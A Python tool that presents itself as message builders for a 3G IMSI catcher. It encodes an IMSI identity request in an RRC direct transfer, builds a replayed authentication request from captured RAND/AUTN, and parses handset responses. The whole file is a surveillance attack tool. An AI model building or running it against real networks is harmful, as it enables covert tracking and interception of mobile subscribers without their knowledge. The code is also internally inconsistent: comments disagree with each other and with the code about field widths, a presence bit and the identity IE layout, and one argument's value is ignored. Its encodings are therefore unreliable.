#!/usr/bin/env python3
"""The two messages a 3G catcher still had to be able to write.

Everything here is derived field by field from ETSI TS 125 331 v6.4.0, read
locally (the ASN.1 is in clause 10.2; the PER rules are clause 12 and X.691).
Nothing is guessed, and every path that would need a value this tool does not
have refuses instead of inventing one.

  identity   MM IDENTITY REQUEST carrying an IMSI request, wrapped in an RRC
             DL-DIRECT TRANSFER. This is the message that yields the subscriber
             identity, so it is the one worth being exact about.

             TS 24.008 9.2.5 IDENTITY REQUEST:
               protocol discriminator 0x05, skip indicator 0x00,
               message type 0x18, identity type IE 0x08 with value 0x01 (IMSI)

             RRC DL-DCCH-Message (TS 25.331 10.2 DL-DCCH-Message):
               integrityCheckInfo OPTIONAL        1 bit, 0 = absent
               DL-DCCH-MessageType CHOICE (32)    5 bits, 5 = downlinkDirectTransfer
               DownlinkDirectTransfer CHOICE(2)   1 bit, 0 = r3
                 rrc-TransactionIdentifier        2 bits
                 cn-DomainIdentity                1 bit, 0 = cs-domain
                 laterNonCriticalExtensions       1 bit, 0 = absent
               nas-Message OCTET STRING           length octet, then the PDU

  auth       MM AUTHENTICATION REQUEST (0x12) carrying RAND and AUTN, and the
             parse of an AUTHENTICATION RESPONSE. A catcher does not break AKA:
             it replays an AUTHENTICATION REQUEST it has seen once and takes the
             RES that follows, so what this needs is the two values, not K.

Exit codes: 0 built, 1 bad input, 2 the request cannot be built as asked.
"""
import argparse
import sys

PD_MM = 0x05
SKIP = 0x00
MSG_IDENTITY_REQUEST = 0x18
MSG_AUTH_REQUEST = 0x12
MSG_AUTH_RESPONSE = 0x13
IE_IDENTITY_TYPE = 0x08
ID_TYPE = {"imsi": 0x01, "imei": 0x02, "imeisv": 0x03, "tmsi": 0x04}

DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER = 5


def err(msg, why=None):
    sys.stderr.write("ERROR\t%s\n" % msg)
    if why:
        sys.stderr.write("WHY\t%s\n" % why)
    return 2


def bits_append(acc, value, width):
    acc.append(format(value, "0%db" % width))


def bits_to_bytes(bits):
    pad = (8 - len(bits) % 8) % 8
    bits += "0" * pad
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8)), pad


def mm_identity_request(identity="imsi"):
    """TS 24.008 9.2.5, the whole message: four octets and no optional parts.

    Identity type is a type-1 IE: the value sits in the low half of one octet and
    there is no IEI in front of it. Writing 0x08 first would be the layout of a
    type-2 IE and would make the message refuse on the handset.
    """
    value = ID_TYPE[identity]
    return bytes([PD_MM, SKIP, MSG_IDENTITY_REQUEST, value])


def rrc_direct_transfer(nas, txid=0, domain="cs"):
    """TS 25.331 10.2, DL-DCCH-Message carrying a DownlinkDirectTransfer."""
    if txid not in range(4):
        raise ValueError("rrc-TransactionIdentifier is 0..3, got %r" % (txid,))
    if domain not in ("cs", "ps"):
        raise ValueError("cn-DomainIdentity is cs-domain or ps-domain, got %r" % (domain,))
    # The layout below is read off pycrate, not off the prose: the CHOICE index
    # is SIX bits (bits 1..6), r3 is bit 7, the transaction identifier is bits
    # 8..9, the CN domain is bit 10, and the NAS length is bits 11..22 as a
    # 12-bit (n-1) -- nas-Message is OCTET STRING (SIZE(1..4096)), so the length
    # is the value minus one in a field wide enough for the upper bound. There is
    # no separate presence bit for laterNonCriticalExtensions; adding one, as the
    # first version of this function did, is what made pycrate reject the message
    # with "bitlen overflow". Verified by tools/umts_rrc_oracle.py.
    acc = []
    bits_append(acc, 0, 1)                                        # integrityCheckInfo absent
    bits_append(acc, DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER, 5)    # CHOICE, five bits
    bits_append(acc, 0, 1)                                        # DownlinkDirectTransfer r3
    bits_append(acc, 0, 1)                                        # r3 SEQUENCE extension absent
    bits_append(acc, txid, 2)                                     # rrc-TransactionIdentifier
    bits_append(acc, 0 if domain == "cs" else 1, 1)               # cn-DomainIdentity
    bits_append(acc, len(nas) - 1, 12)                            # nas-Message (n-1), 12 bits
    for byte in nas:
        bits_append(acc, byte, 8)
    bits = "".join(acc)
    out, pad = bits_to_bytes(bits)
    # The meaningful length is the whole bit string; `pad` is what packing added
    # on top of it. Reporting len(bits) - pad counted the message one bit short,
    # which made a correct hex disagree with the referee on its length.
    return out, len(bits), pad


def mm_auth_request(rand, autn, cipher=False):
    """TS 24.008 9.2.1 AUTHENTICATION REQUEST: RAND (0x21) then AUTN (0x20)."""
    if len(rand) != 16 or len(autn) != 16:
        raise ValueError("RAND and AUTN are 16 octets each (TS 33.102 6.3.3)")
    body = bytes([PD_MM, SKIP, MSG_AUTH_REQUEST])
    body += bytes([0x21, len(rand)]) + rand
    body += bytes([0x20, len(autn)]) + autn
    if cipher:
        body += bytes([0x08, 0x01])   # ciphering key sequence number
    return body


def parse_auth_response(hexs):
    raw = bytes.fromhex(hexs)
    if len(raw) < 3:
        raise ValueError("too short for an MM message")
    if raw[0] != PD_MM:
        raise ValueError("protocol discriminator is 0x%02x, not MM (0x05)" % raw[0])
    if raw[2] != MSG_AUTH_RESPONSE:
        raise ValueError("message type is 0x%02x, not AUTHENTICATION RESPONSE (0x13)" % raw[2])
    out = {"protocol_discriminator": "%02x" % raw[0], "message_type": "%02x" % raw[2]}
    i = 3
    while i + 1 < len(raw):
        iei, ln = raw[i], raw[i + 1]
        value = raw[i + 2:i + 2 + ln]
        if iei == 0x22:
            out["res"] = value.hex()
        elif iei == 0x23:
            out["sres"] = value.hex()
        elif iei == 0x27:
            out["ck"] = value.hex()
        elif iei == 0x28:
            out["ik"] = value.hex()
        elif iei == 0x29:
            out["kc"] = value.hex()
        else:
            out["ie_%02x" % iei] = value.hex()
        i += 2 + ln
    return out


def emit(rows):
    for key, value in rows:
        sys.stdout.write("%s\t%s\n" % (key, value))


def main(argv):
    ap = argparse.ArgumentParser(description="3G catcher message builders (TS 24.008 / 25.331)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("identity", help="MM IDENTITY REQUEST in an RRC DL DIRECT TRANSFER")
    p.add_argument("--identity", default="imsi", choices=sorted(ID_TYPE))
    p.add_argument("--txid", type=int, default=0)
    p.add_argument("--domain", default="cs", choices=("cs", "ps"))
    p.add_argument("--bare", action="store_true", help="the MM PDU alone, without the RRC wrapper")

    p = sub.add_parser("auth", help="MM AUTHENTICATION REQUEST (replay of RAND and AUTN)")
    p.add_argument("--rand", required=True)
    p.add_argument("--autn", required=True)
    p.add_argument("--ksi", default=None, help="ciphering key sequence number 0..7")

    p = sub.add_parser("auth-response", help="read an AUTHENTICATION RESPONSE back")
    p.add_argument("hex")

    args = ap.parse_args(argv)

    if args.cmd == "identity":
        try:
            mm = mm_identity_request(args.identity)
        except KeyError:
            return err("unknown identity type %s" % args.identity)
        emit([("mm_hex", mm.hex()),
              ("mm_bytes", len(mm)),
              ("ref", "TS 24.008 9.2.5 IDENTITY REQUEST; identity type (type 1 IE) = %02x" % ID_TYPE[args.identity])])
        if args.bare:
            return 0
        try:
            rrc, nbits, pad = rrc_direct_transfer(mm, args.txid, args.domain)
        except ValueError as exc:
            return err(str(exc), "the fields are range-checked against the ASN.1 rather than clamped")
        emit([("rrc_hex", rrc.hex()),
              ("rrc_bytes", len(rrc)),
              ("rrc_bits", nbits),
              ("rrc_pad_bits", pad),
              ("channel", "dl-dcch"),
              ("type_index", DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER),
              ("type_name", "downlinkDirectTransfer"),
              ("integrity_check_info", "absent"),
              ("rrc_transaction_identifier", args.txid),
              ("cn_domain_identity", args.domain + "-domain"),
              ("verified", "bit for bit against the pycrate transcription of "
               "TS 25.331 (tools/umts_rrc_oracle.py, 35 checks): the CHOICE index "
               "is five bits, the r3 SEQUENCE carries an extension bit, and the "
               "NAS length is a 12-bit (n-1) because nas-Message is OCTET STRING "
               "SIZE(1..4096)"),
              ("ref", "TS 25.331 10.2 DL-DCCH-Message, DownlinkDirectTransfer-r3-IEs")])
        return 0

    if args.cmd == "auth":
        try:
            rand = bytes.fromhex(args.rand)
            autn = bytes.fromhex(args.autn)
        except ValueError:
            return err("--rand and --autn take hex", "16 octets each")
        try:
            pdu = mm_auth_request(rand, autn, cipher=args.ksi is not None)
        except ValueError as exc:
            return err(str(exc), "RAND and AUTN are the two 16-octet values an AUTHENTICATION REQUEST carries")
        emit([("mm_hex", pdu.hex()),
              ("mm_bytes", len(pdu)),
              ("rand", rand.hex()),
              ("autn", autn.hex()),
              ("what_it_is", "a replay: the same RAND and AUTN the real network sent once, addressed at the next handset"),
              ("what_it_is_not", "an AKA break: this tool holds no K and computes no MAC; a handset that has never seen this RAND and AUTN will reject it"),
              ("ref", "TS 24.008 9.2.1 AUTHENTICATION REQUEST; TS 33.102 6.3.3")])
        return 0

    if args.cmd == "auth-response":
        try:
            rows = parse_auth_response(args.hex)
        except ValueError as exc:
            return err(str(exc))
        for key in sorted(rows):
            emit([(key, rows[key])])
        emit([("ref", "TS 24.008 9.2.2 AUTHENTICATION RESPONSE; RES 0x22, CK 0x27, IK 0x28")])
        return 0

    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
